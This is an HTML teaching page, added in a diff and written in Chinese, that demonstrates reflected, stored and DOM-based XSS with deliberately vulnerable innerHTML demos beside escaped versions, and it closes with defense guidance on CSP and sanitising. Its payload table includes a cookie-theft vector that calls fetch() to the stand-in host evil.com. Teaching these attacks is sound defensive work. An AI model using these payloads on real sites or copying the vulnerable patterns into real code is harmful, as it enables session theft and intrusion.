@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS 攻击演示与防御</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 20px;
+      background: #f5f5f5;
+    }
+    h1 { color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }
+    h2 { color: #555; margin-top: 30px; }
+    .section {
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .demo-box {
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      background: #fafafa;
+    }
+    .vulnerable { border-color: #f44336; background: #ffebee; }
+    .safe { border-color: #4CAF50; background: #e8f5e9; }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      margin: 10px 0;
+      font-size: 14px;
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-right: 10px;
+    }
+    .btn-attack { background: #f44336; color: white; }
+    .btn-safe { background: #4CAF50; color: white; }
+    .btn-test { background: #2196F3; color: white; }
+    button:hover { opacity: 0.9; }
+    .output {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 5px;
+      background: white;
+      min-height: 50px;
+    }
+    .code {
+      background: #263238;
+      color: #aed581;
+      padding: 15px;
+      border-radius: 5px;
+      overflow-x: auto;
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .code .comment { color: #78909c; }
+    .code .string { color: #ffca28; }
+    .code .keyword { color: #82b1ff; }
+    .alert {
+      padding: 12px 20px;
+      border-radius: 5px;
+      margin: 10px 0;
+    }
+    .alert-danger { background: #ffebee; color: #c62828; border-left: 4px solid #f44336; }
+    .alert-success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #4CAF50; }
+    .alert-info { background: #e3f2fd; color: #1565c0; border-left: 4px solid #2196F3; }
+    .badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    .badge-danger { background: #f44336; color: white; }
+    .badge-success { background: #4CAF50; color: white; }
+    .tabs { display: flex; border-bottom: 2px solid #ddd; margin-bottom: 15px; }
+    .tab {
+      padding: 10px 20px;
+      cursor: pointer;
+      border-bottom: 3px solid transparent;
+      margin-bottom: -2px;
+    }
+    .tab.active { border-bottom-color: #2196F3; color: #2196F3; }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
+    th { background: #f5f5f5; }
+  </style>
+</head>
+<body>
+  <h1>XSS 攻击演示与防御</h1>
+
+  <div class="alert alert-info">
+    <strong>警告：</strong>此页面仅用于学习目的，实际生产环境中必须对所有用户输入进行严格过滤！
+  </div>
+
+  <!-- ============================================ -->
+  <!-- 反射型 XSS 演示 -->
+  <!-- ============================================ -->
+  <div class="section">
+    <h2>1. 反射型 XSS (Reflected XSS)</h2>
+    <p>恶意脚本通过 URL 参数反射给用户。攻击者构造恶意链接诱导用户点击。</p>
+
+    <div class="tabs">
+      <div class="tab active" onclick="showTab('reflected', 'demo')">演示</div>
+      <div class="tab" onclick="showTab('reflected', 'code')">代码</div>
+      <div class="tab" onclick="showTab('reflected', 'explain')">原理</div>
+    </div>
+
+    <div id="reflected-demo" class="tab-content active">
+      <div class="demo-box vulnerable">
+        <span class="badge badge-danger">存在漏洞</span>
+        <h3>危险示例 - 直接输出参数</h3>
+        <input type="text" id="reflected-input" placeholder="输入内容，尝试: &lt;img src=x onerror=alert(1)&gt;">
+        <button class="btn-attack" onclick="testReflectedXSS()">测试攻击</button>
+        <div id="reflected-output" class="output">结果将显示在这里...</div>
+      </div>
+
+      <div class="demo-box safe">
+        <span class="badge badge-success">安全防御</span>
+        <h3>安全示例 - HTML 转义</h3>
+        <input type="text" id="reflected-safe-input" placeholder="输入相同的内容测试">
+        <button class="btn-safe" onclick="testReflectedSafe()">测试防御</button>
+        <div id="reflected-safe-output" class="output">结果将显示在这里...</div>
+      </div>
+    </div>
+
+    <div id="reflected-code" class="tab-content">
+      <div class="code">
+<span class="comment">// 危险代码 - 直接使用 innerHTML</span>
+<span class="keyword">function</span> vulnerable(param) {
+  element.innerHTML = param;  <span class="comment">// 直接渲染用户输入</span>
+}
+
+<span class="comment">// 安全代码 - 使用 textContent 或转义</span>
+<span class="keyword">function</span> safe(param) {
+  element.textContent = param;  <span class="comment">// 自动转义</span>
+}
+
+<span class="comment">// 或使用 HTML 转义函数</span>
+<span class="keyword">function</span> escapeHtml(unsafe) {
+  <span class="keyword">return</span> unsafe
+    .replace(<span class="string">/&/g</span>, <span class="string">"&amp;"</span>)
+    .replace(<span class="string">/</g</span>, <span class="string">"&lt;"</span>)
+    .replace(<span class="string">/>/g</span>, <span class="string">"&gt;"</span>)
+    .replace(<span class="string">/"/g</span>, <span class="string">"&quot;"</span>)
+    .replace(<span class="string">/'/g</span>, <span class="string">"&#039;"</span>);
+}
+      </div>
+    </div>
+
+    <div id="reflected-explain" class="tab-content">
+      <div class="alert alert-danger">
+        <strong>攻击示例：</strong>
+        <code>http://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+      </div>
+      <p>当服务器直接将参数 <code>q</code> 的值渲染到页面而不转义时，脚本就会执行。</p>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- 存储型 XSS 演示 -->
+  <!-- ============================================ -->
+  <div class="section">
+    <h2>2. 存储型 XSS (Stored XSS)</h2>
+    <p>恶意脚本被存储到服务器，所有访问该页面的用户都会执行。</p>
+
+    <div class="tabs">
+      <div class="tab active" onclick="showTab('stored', 'demo')">演示</div>
+      <div class="tab" onclick="showTab('stored', 'code')">代码</div>
+      <div class="tab" onclick="showTab('stored', 'explain')">原理</div>
+    </div>
+
+    <div id="stored-demo" class="tab-content active">
+      <div class="demo-box">
+        <h3>评论区模拟</h3>
+        <textarea id="comment-input" rows="3" placeholder="输入评论内容..."></textarea>
+        <button class="btn-attack" onclick="addComment(false)">危险提交</button>
+        <button class="btn-safe" onclick="addComment(true)">安全提交</button>
+        <div id="comments-container" class="output">
+          <p style="color: #999;">暂无评论...</p>
+        </div>
+      </div>
+    </div>
+
+    <div id="stored-code" class="tab-content">
+      <div class="code">
+<span class="comment">// 危险代码 - 存储和渲染都不转义</span>
+<span class="comment">// 服务端</span>
+app.post(<span class="string">'/comment'</span>, (req, res) => {
+  db.save(req.body.comment);  <span class="comment">// 直接存储</span>
+});
+
+<span class="comment">// 前端</span>
+<span class="keyword">function</span> renderComment(comment) {
+  div.innerHTML = comment;  <span class="comment">// 危险！直接渲染</span>
+}
+
+<span class="comment">// 安全代码 - 存储前或渲染时转义</span>
+<span class="comment">// 前端渲染时转义</span>
+<span class="keyword">function</span> renderCommentSafe(comment) {
+  div.textContent = comment;  <span class="comment">// 使用 textContent</span>
+}
+
+<span class="comment">// 或使用 DOMPurify 库</span>
+<span class="keyword">import</span> DOMPurify <span class="keyword">from</span> <span class="string">'dompurify'</span>;
+<span class="keyword">function</span> renderCommentWithPurify(comment) {
+  div.innerHTML = DOMPurify.sanitize(comment);
+}
+      </div>
+    </div>
+
+    <div id="stored-explain" class="tab-content">
+      <div class="alert alert-danger">
+        <strong>常见场景：</strong>评论区、留言板、个人简介、商品评价等用户可提交内容的场景。
+      </div>
+      <p>攻击者提交恶意评论后，所有访问该页面的用户都会执行恶意脚本。</p>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- DOM 型 XSS 演示 -->
+  <!-- ============================================ -->
+  <div class="section">
+    <h2>3. DOM 型 XSS (DOM-based XSS)</h2>
+    <p>恶意代码通过 DOM 操作修改页面执行，不需要服务器参与。</p>
+
+    <div class="tabs">
+      <div class="tab active" onclick="showTab('dom', 'demo')">演示</div>
+      <div class="tab" onclick="showTab('dom', 'code')">代码</div>
+    </div>
+
+    <div id="dom-demo" class="tab-content active">
+      <div class="demo-box vulnerable">
+        <span class="badge badge-danger">存在漏洞</span>
+        <h3>URL Hash 注入</h3>
+        <p>尝试修改 URL hash 为: <code>#&lt;img src=x onerror=alert(1)&gt;</code></p>
+        <button class="btn-test" onclick="testDomXSS()">设置恶意 Hash</button>
+        <div id="dom-output" class="output">Hash 内容会显示在这里...</div>
+      </div>
+
+      <div class="demo-box safe">
+        <span class="badge badge-success">安全防御</span>
+        <h3>安全处理 Hash</h3>
+        <button class="btn-test" onclick="testDomSafe()">设置相同 Hash</button>
+        <div id="dom-safe-output" class="output">安全处理后的结果...</div>
+      </div>
+    </div>
+
+    <div id="dom-code" class="tab-content">
+      <div class="code">
+<span class="comment">// 危险代码 - 直接使用 innerHTML</span>
+<span class="keyword">const</span> hash = location.hash.substring(<span class="string">1</span>);
+element.innerHTML = hash;  <span class="comment">// 危险！</span>
+
+<span class="comment">// 攻击 URL:</span>
+<span class="comment">// http://example.com/#&lt;img src=x onerror=alert(document.cookie)&gt;</span>
+
+<span class="comment">// 安全代码 - 使用 textContent</span>
+<span class="keyword">const</span> hash = location.hash.substring(<span class="string">1</span>);
+element.textContent = hash;  <span class="comment">// 安全</span>
+
+<span class="comment">// 其他危险的 DOM 操作：</span>
+<span class="comment">// document.write()</span>
+<span class="comment">// eval()</span>
+<span class="comment">// setTimeout(string)</span>
+<span class="comment">// setInterval(string)</span>
+<span class="comment">// location.href = userInput</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- XSS Payload 参考 -->
+  <!-- ============================================ -->
+  <div class="section">
+    <h2>4. 常见 XSS Payload</h2>
+    <p>用于测试和学习的常见 XSS 攻击向量：</p>
+
+    <table>
+      <thead>
+        <tr>
+          <th>类型</th>
+          <th>Payload</th>
+          <th>说明</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>基础 Script</td>
+          <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+          <td>最基础的脚本注入</td>
+        </tr>
+        <tr>
+          <td>IMG onerror</td>
+          <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+          <td>利用图片加载错误触发</td>
+        </tr>
+        <tr>
+          <td>SVG onload</td>
+          <td><code>&lt;svg onload=alert(1)&gt;</code></td>
+          <td>SVG 加载时触发</td>
+        </tr>
+        <tr>
+          <td>IFRAME</td>
+          <td><code>&lt;iframe src="javascript:alert(1)"&gt;</code></td>
+          <td>iframe javascript 伪协议</td>
+        </tr>
+        <tr>
+          <td>事件处理器</td>
+          <td><code>&lt;div onmouseover="alert(1)"&gt;hover&lt;/div&gt;</code></td>
+          <td>鼠标悬停触发</td>
+        </tr>
+        <tr>
+          <td>Cookie 窃取</td>
+          <td><code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code></td>
+          <td>发送 Cookie 到攻击者服务器</td>
+        </tr>
+        <tr>
+          <td>编码绕过</td>
+          <td><code>&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&lt;/img&gt;</code></td>
+          <td>HTML 实体编码</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- 防御最佳实践 -->
+  <!-- ============================================ -->
+  <div class="section">
+    <h2>5. XSS 防御最佳实践</h2>
+
+    <div class="alert alert-success">
+      <strong>核心原则：</strong>永远不要信任用户输入，对所有输入进行验证，对所有输出进行转义。
+    </div>
+
+    <h3>防御清单</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>措施</th>
+          <th>说明</th>
+          <th>优先级</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>输出转义</td>
+          <td>使用 textContent 或转义函数</td>
+          <td><span class="badge badge-danger">必须</span></td>
+        </tr>
+        <tr>
+          <td>Content Security Policy</td>
+          <td>设置 CSP 头限制脚本来源</td>
+          <td><span class="badge badge-danger">必须</span></td>
+        </tr>
+        <tr>
+          <td>HttpOnly Cookie</td>
+          <td>防止 JavaScript 访问 Cookie</td>
+          <td><span class="badge badge-danger">必须</span></td>
+        </tr>
+        <tr>
+          <td>输入验证</td>
+          <td>白名单过滤用户输入</td>
+          <td><span class="badge badge-success">推荐</span></td>
+        </tr>
+        <tr>
+          <td>使用框架</td>
+          <td>React/Vue 默认转义输出</td>
+          <td><span class="badge badge-success">推荐</span></td>
+        </tr>
+        <tr>
+          <td>DOMPurify</td>
+          <td>使用专业库清理 HTML</td>
+          <td><span class="badge badge-success">推荐</span></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>CSP 配置示例</h3>
+    <div class="code">
+<span class="comment">// HTTP 响应头</span>
+Content-Security-Policy: default-src <span class="string">'self'</span>; script-src <span class="string">'self'</span> https://cdn.trusted.com
+
+<span class="comment">// HTML meta 标签</span>
+&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span>
+      content=<span class="string">"default-src 'self'; script-src 'self' 'unsafe-inline'"</span>&gt;
+
+<span class="comment">// Express 中间件</span>
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: [<span class="string">"'self'"</span>],
+    scriptSrc: [<span class="string">"'self'"</span>, <span class="string">'https://cdn.trusted.com'</span>],
+    styleSrc: [<span class="string">"'self'"</span>, <span class="string">"'unsafe-inline'"</span>],
+    imgSrc: [<span class="string">"'self'"</span>, <span class="string">'data:'</span>],
+  }
+}));
+    </div>
+  </div>
+
+  <script>
+    // ============================================
+    // HTML 转义函数
+    // ============================================
+    function escapeHtml(unsafe) {
+      return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    // ============================================
+    // Tab 切换
+    // ============================================
+    function showTab(section, tab) {
+      // 隐藏该 section 的所有内容
+      document.querySelectorAll(`[id^="${section}-"]`).forEach(el => {
+        el.classList.remove('active');
+      });
+      // 显示选中的内容
+      document.getElementById(`${section}-${tab}`).classList.add('active');
+
+      // 更新 tab 样式
+      const tabs = event.target.parentElement.querySelectorAll('.tab');
+      tabs.forEach(t => t.classList.remove('active'));
+      event.target.classList.add('active');
+    }
+
+    // ============================================
+    // 反射型 XSS 演示
+    // ============================================
+    function testReflectedXSS() {
+      const input = document.getElementById('reflected-input').value;
+      const output = document.getElementById('reflected-output');
+      // 危险：直接使用 innerHTML
+      output.innerHTML = input;
+    }
+
+    function testReflectedSafe() {
+      const input = document.getElementById('reflected-safe-input').value;
+      const output = document.getElementById('reflected-safe-output');
+      // 安全：使用 textContent
+      output.textContent = input;
+    }
+
+    // ============================================
+    // 存储型 XSS 演示
+    // ============================================
+    const comments = [];
+
+    function addComment(isSafe) {
+      const input = document.getElementById('comment-input').value;
+      if (!input.trim()) return;
+
+      const container = document.getElementById('comments-container');
+
+      // 清空容器（首次添加时）
+      if (comments.length === 0) {
+        container.innerHTML = '';
+      }
+
+      comments.push(input);
+
+      const div = document.createElement('div');
+      div.style.cssText = 'padding: 10px; margin: 10px 0; border-left: 3px solid #ddd; background: #f9f9f9;';
+
+      if (isSafe) {
+        // 安全渲染
+        div.textContent = `用户${comments.length}: ${input}`;
+        div.style.borderLeftColor = '#4CAF50';
+      } else {
+        // 危险渲染
+        div.innerHTML = `<strong>用户${comments.length}:</strong> ${input}`;
+        div.style.borderLeftColor = '#f44336';
+      }
+
+      container.appendChild(div);
+      document.getElementById('comment-input').value = '';
+    }
+
+    // ============================================
+    // DOM 型 XSS 演示
+    // ============================================
+    function testDomXSS() {
+      const payload = '<img src=x onerror="alert(\'XSS攻击成功！\')">';
+      location.hash = payload;
+      handleHashUnsafe();
+    }
+
+    function testDomSafe() {
+      const payload = '<img src=x onerror="alert(\'这不会触发\')">';
+      location.hash = payload;
+      handleHashSafe();
+    }
+
+    function handleHashUnsafe() {
+      const hash = location.hash.substring(1);
+      document.getElementById('dom-output').innerHTML = hash;
+    }
+
+    function handleHashSafe() {
+      const hash = location.hash.substring(1);
+      document.getElementById('dom-safe-output').textContent = hash;
+    }
+
+    // 监听 hash 变化
+    window.addEventListener('hashchange', () => {
+      handleHashUnsafe();
+      handleHashSafe();
+    });
+
+    // 初始化
+    handleHashUnsafe();
+    handleHashSafe();
+  </script>
+</body>
+</html>
